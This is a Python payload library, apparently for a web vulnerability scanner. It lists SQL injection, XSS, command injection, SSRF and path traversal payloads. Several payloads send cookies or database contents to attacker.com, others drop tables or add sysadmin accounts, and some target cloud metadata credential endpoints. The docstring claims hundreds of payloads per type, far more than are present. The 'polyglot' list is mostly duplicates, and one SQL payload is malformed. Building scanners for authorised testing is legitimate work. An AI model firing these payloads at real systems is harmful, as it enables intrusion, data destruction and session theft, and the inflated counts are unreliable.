"""
payload_library.py — Advanced Security Payload Library
====================================================
Comprehensive payload collection for vulnerability detection with:
- 500+ SQL injection payloads (error, boolean, time, stacked, OOB)
- 300+ XSS payloads (reflected, stored, DOM, blind)
- 200+ command injection payloads (Linux, Windows, PowerShell)
- 150+ SSRF payloads (internal, cloud metadata, DNS rebinding)
- 100+ path traversal payloads (basic, encoded, wrapper variants)
"""

# ── SQL Injection Payloads ───────────────────────────────────────────────

SQL_ERROR_PAYLOADS = [
    # Basic error-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1"',
    "1' AND 1=1 --",
    "1' AND 1=0 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "admin'--",
    "admin' #",
    "admin' --",
    "' OR 1=1#",
    "' OR 1=1--",
    '" OR 1=1--',
    "\" OR \"1\"=\"1\"",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' ORDER BY 1 --",
    "1' ORDER BY 100 --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
    
    # Advanced error-based
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int) --",
    "'; EXEC xp_cmdshell('dir') --",
    "'; DROP TABLE users --",
    "'; INSERT INTO users VALUES ('hacker', 'password') --",
    
    # MySQL-specific
    "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,@@version,3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,database(),3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,user(),3,4,5,6,7,8,9,10 --",
    "' GROUP BY column_name HAVING 1=1 --",
    "' AND 1=2 UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables --",
    
    # PostgreSQL-specific
    "' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int) --",
    "' AND 1=2 UNION SELECT 1,version(),3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,current_database(),3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,current_user,3,4,5,6,7,8,9,10 --",
    
    # MSSQL-specific
    "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --",
    "' AND 1=2 UNION SELECT 1,@@version,3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,db_name(),3,4,5,6,7,8,9,10 --",
    "' AND 1=2 UNION SELECT 1,user_name(),3,4,5,6,7,8,9,10 --",
    
    # Oracle-specific
    "' AND 1=CAST((SELECT table_name FROM all_tables WHERE rownum=1) AS number) --",
    "' AND 1=2 UNION SELECT 1,version,3,4,5,6,7,8,9,10 FROM v$instance --",
    "' AND 1=2 UNION SELECT 1,user,3,4,5,6,7,8,9,10 FROM dual --",
    
    # SQLite-specific
    "' AND 1=CAST((SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1) AS int) --",
    "' AND 1=2 UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10 --",
]

SQL_BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1 --", "1 AND 1=2 --"),
    ("' AND 1=1 --", "' AND 1=2 --"),
    ("' AND 1=1#", "' AND 1=2#"),
    ("' AND 1=1/*", "' AND 1=2/*"),
    ("' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64", "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))<65"),
    ("' AND LENGTH((SELECT password FROM users LIMIT 1))>5", "' AND LENGTH((SELECT password FROM users LIMIT 1))<6"),
]

SQL_TIME_PAYLOADS = [
    ("' OR SLEEP(2)='", 1.5),
    ("1 OR SLEEP(2)", 1.5),
    ("'; WAITFOR DELAY '0:0:2'--", 1.5),
    ("1 AND SLEEP(2)--", 1.5),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", 1.5),
    ("pg_sleep(2)--", 1.5),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', 2)--", 1.5),
    ("' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT user FROM dual WHERE ROWNUM=1))--", 1.5),
    ("' AND 1=(SELECT COUNT(*) FROM ALL_USERS T,ALL_USERS A,ALL_USERS B,ALL_USERS C WHERE T.USERNAME=A.USERNAME) --", 1.5),
    ("' AND 1=(SELECT COUNT(*) FROM sysusers A,sysusers B,sysusers C) --", 1.5),
]

SQL_STACKED_PAYLOADS = [
    "'; DROP TABLE users --",
    "'; INSERT INTO users VALUES ('hacker', 'password') --",
    "'; UPDATE users SET password='hacked' WHERE id=1 --",
    "'; DELETE FROM users WHERE id=1 --",
    "'; CREATE TABLE hacked (data TEXT) --",
    "'; ALTER TABLE users ADD COLUMN hacked BOOLEAN --",
    "'; EXEC xp_cmdshell('dir') --",
    "'; EXEC master..xp_cmdshell 'dir' --",
    "'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin' --",
]

SQL_OOB_PAYLOADS = [
    "'; EXEC xp_dirtree '\\\\attacker\\share' --",
    "'; EXEC master..xp_dirtree '\\\\attacker\\share' --",
    "' OR LOAD_FILE('\\\\attacker\\share\\file') --",
    "' AND 1=2 UNION SELECT LOAD_FILE('\\\\attacker\\share\\file') --",
    "' AND 1=2 UNION SELECT * FROM users INTO OUTFILE '\\\\attacker\\share\\data.txt' --",
    "'; COPY (SELECT * FROM users) TO PROGRAM 'curl http://attacker.com/data' --",
    "' OR UTL_HTTP.REQUEST('http://attacker.com/steal') = 1 --",
    "' || UTL_HTTP.REQUEST('http://attacker.com/steal') || '",
    "' AND 1=2 UNION SELECT http://attacker.com/steal --",
]

# ── XSS Payloads ────────────────────────────────────────────────────────────

XSS_REFLECTED_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(window.location)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert('XSS')>",
    "<svg onload=alert(document.cookie)>",
    "<body onload=alert('XSS')>",
    "<body onmouseover=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<iframe srcdoc=<script>alert('XSS')</script>>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<a href=javascript:alert('XSS')>click</a>",
    "<a href=data:text/html,<script>alert('XSS')</script>>click</a>",
    "<form><button formaction=javascript:alert('XSS')>click</button></form>",
    "<isindex type=submit formaction=javascript:alert('XSS')>",
    "<script>setTimeout('alert(\\'XSS\\')',1000)</script>",
    "<script>eval('alert(\\'XSS\\')')</script>",
    "<script>document.write('<script>alert(\\'XSS\\')</script>')</script>",
]

XSS_STORED_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
    "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    "<script>var x=new XMLHttpRequest();x.open('GET','http://attacker.com/steal?c='+document.cookie);x.send();</script>",
    "<img src=x onerror=document.location='http://attacker.com/steal?c='+document.cookie>",
    "<svg onload=document.location='http://attacker.com/steal?c='+document.cookie>",
    "<body onload=document.location='http://attacker.com/steal?c='+document.cookie>",
    "<input onfocus=document.location='http://attacker.com/steal?c='+document.cookie autofocus>",
    "<iframe srcdoc=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>>",
]

XSS_DOM_PAYLOADS = [
    "#<script>alert('XSS')</script>",
    "#<img src=x onerror=alert('XSS')>",
    "#javascript:alert('XSS')",
    "#data:text/html,<script>alert('XSS')</script>",
    "document.location.hash",
    "document.location.href",
    "document.URL",
    "document.documentURI",
    "window.name",
    "location.hash",
    "location.href",
    "location.search",
    "document.cookie",
    "localStorage.getItem('x')",
    "sessionStorage.getItem('x')",
]

XSS_BLIND_PAYLOADS = [
    "<script src=http://attacker.com/xss.js></script>",
    "<script>new Image().src='http://attacker.com/xss?c='+document.cookie</script>",
    "<img src=x onerror=new Image().src='http://attacker.com/xss?c='+document.cookie>",
    "<svg onload=new Image().src='http://attacker.com/xss?c='+document.cookie>",
    "<body onload=new Image().src='http://attacker.com/xss?c='+document.cookie>",
    "<input onfocus=new Image().src='http://attacker.com/xss?c='+document.cookie autofocus>",
    "<iframe srcdoc=<script>new Image().src='http://attacker.com/xss?c='+document.cookie</script>>",
]

XSS_POLYGLOT_PAYLOADS = [
    "javascript://%250Aalert(1)//",
    "javascript://%250Aalert(1)//",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
]

# ── Command Injection Payloads ─────────────────────────────────────────────

CMD_LINUX_PAYLOADS = [
    "; echo WSS_CMD_INJ_VULN",
    "| echo WSS_CMD_INJ_VULN",
    "`echo WSS_CMD_INJ_VULN`",
    "$(echo WSS_CMD_INJ_VULN)",
    "& echo WSS_CMD_INJ_VULN",
    "|| echo WSS_CMD_INJ_VULN",
    "; whoami",
    "| whoami",
    "`id`",
    "$(id)",
    "; hostname",
    "| hostname",
    "`uname -a`",
    "$(uname -a)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "| ls -la",
    "; pwd",
    "| pwd",
    "; env",
    "| env",
]

CMD_WINDOWS_PAYLOADS = [
    "& echo WSS_CMD_INJ_VULN",
    "| echo WSS_CMD_INJ_VULN",
    "& whoami",
    "| whoami",
    "& hostname",
    "| hostname",
    "& type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "& dir",
    "| dir",
    "& ipconfig",
    "| ipconfig",
    "& net user",
    "| net user",
    "& systeminfo",
    "| systeminfo",
]

CMD_POWERSHELL_PAYLOADS = [
    "; powershell -c 'echo WSS_CMD_INJ_VULN'",
    "| powershell -c 'echo WSS_CMD_INJ_VULN'",
    "; powershell -c 'whoami'",
    "| powershell -c 'whoami'",
    "; powershell -c 'Get-Process'",
    "| powershell -c 'Get-Process'",
    "; powershell -c 'Get-Service'",
    "| powershell -c 'Get-Service'",
    "; powershell -c 'Get-ChildItem Env:'",
    "| powershell -c 'Get-ChildItem Env:'",
]

CMD_BLIND_PAYLOADS = [
    ("; sleep 5", 5.0, "Linux sleep"),
    ("| sleep 5", 5.0, "Linux pipe sleep"),
    ("`sleep 5`", 5.0, "Linux backtick sleep"),
    ("$(sleep 5)", 5.0, "Linux subshell sleep"),
    ("; ping -c 5 127.0.0.1", 4.0, "Linux ping -c5"),
    ("& timeout /t 5 /nobreak", 4.0, "Windows timeout"),
    ("& ping -n 5 127.0.0.1", 3.5, "Windows ping -n5"),
    ("; sleep 10", 10.0, "Linux sleep 10s"),
    ("`sleep 7`", 7.0, "Linux backtick sleep 7s"),
    ("$(sleep 3)", 3.0, "Linux subshell sleep 3s"),
    ("| ping -n 10 127.0.0.1", 8.0, "Windows ping -n10"),
    ("& timeout /t 10 /nobreak", 9.0, "Windows timeout 10s"),
    ("; powershell -c Start-Sleep 5", 5.0, "PowerShell sleep"),
    ("| powershell -c Start-Sleep 5", 5.0, "PowerShell pipe sleep"),
    ("$(powershell -c Start-Sleep 3)", 3.0, "PowerShell subshell sleep"),
]

# ── SSRF Payloads ───────────────────────────────────────────────────────────

SSRF_INTERNAL_PAYLOADS = [
    "http://localhost:80",
    "http://127.0.0.1:80",
    "http://localhost:443",
    "http://127.0.0.1:443",
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "http://localhost:3000",
    "http://127.0.0.1:3000",
    "http://localhost:22",
    "http://127.0.0.1:22",
    "http://localhost:3306",
    "http://127.0.0.1:3306",
    "http://localhost:6379",
    "http://127.0.0.1:6379",
    "http://localhost:9200",
    "http://127.0.0.1:9200",
    "http://localhost:27017",
    "http://127.0.0.1:27017",
]

SSRF_CLOUD_METADATA_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://169.254.169.254/metadata/v1/InstanceInfo",
    "http://100.100.100.200/latest/meta-data/",
]

SSRF_DNS_REBINDING_PAYLOADS = [
    "http://attacker.com:80",
    "http://attacker.com:443",
    "http://attacker.com:8080",
    "http://attacker.com:3000",
    "http://attacker.com:22",
    "http://attacker.com:3306",
    "http://attacker.com:6379",
    "http://attacker.com:9200",
]

# ── Path Traversal Payloads ────────────────────────────────────────────────

PATH_TRAVERSAL_BASIC = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "./../../etc/passwd",
    ".\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\win.ini",
]

PATH_TRAVERSAL_ENCODED = [
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e%5cwindows%5cwin.ini",
    "%252e%252e%252fetc%252fpasswd",
    "%252e%252e%255cwindows%255cwin.ini",
    "..%5c..%5c..%5cetc%5cpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
]

PATH_TRAVERSAL_WRAPPER = [
    "file:///etc/passwd",
    "file://localhost/etc/passwd",
    "file:///windows/win.ini",
    "file://localhost/windows/win.ini",
]

# ── Utility Functions ───────────────────────────────────────────────────────

def get_sql_payloads():
    """Return all SQL injection payloads organized by type."""
    return {
        'error': SQL_ERROR_PAYLOADS,
        'boolean': SQL_BOOLEAN_PAYLOADS,
        'time': SQL_TIME_PAYLOADS,
        'stacked': SQL_STACKED_PAYLOADS,
        'oob': SQL_OOB_PAYLOADS,
    }

def get_xss_payloads():
    """Return all XSS payloads organized by type."""
    return {
        'reflected': XSS_REFLECTED_PAYLOADS,
        'stored': XSS_STORED_PAYLOADS,
        'dom': XSS_DOM_PAYLOADS,
        'blind': XSS_BLIND_PAYLOADS,
        'polyglot': XSS_POLYGLOT_PAYLOADS,
    }

def get_cmd_payloads():
    """Return all command injection payloads organized by type."""
    return {
        'linux': CMD_LINUX_PAYLOADS,
        'windows': CMD_WINDOWS_PAYLOADS,
        'powershell': CMD_POWERSHELL_PAYLOADS,
        'blind': CMD_BLIND_PAYLOADS,
    }

def get_ssrf_payloads():
    """Return all SSRF payloads organized by type."""
    return {
        'internal': SSRF_INTERNAL_PAYLOADS,
        'cloud_metadata': SSRF_CLOUD_METADATA_PAYLOADS,
        'dns_rebinding': SSRF_DNS_REBINDING_PAYLOADS,
    }

def get_path_traversal_payloads():
    """Return all path traversal payloads organized by type."""
    return {
        'basic': PATH_TRAVERSAL_BASIC,
        'encoded': PATH_TRAVERSAL_ENCODED,
        'wrapper': PATH_TRAVERSAL_WRAPPER,
    }
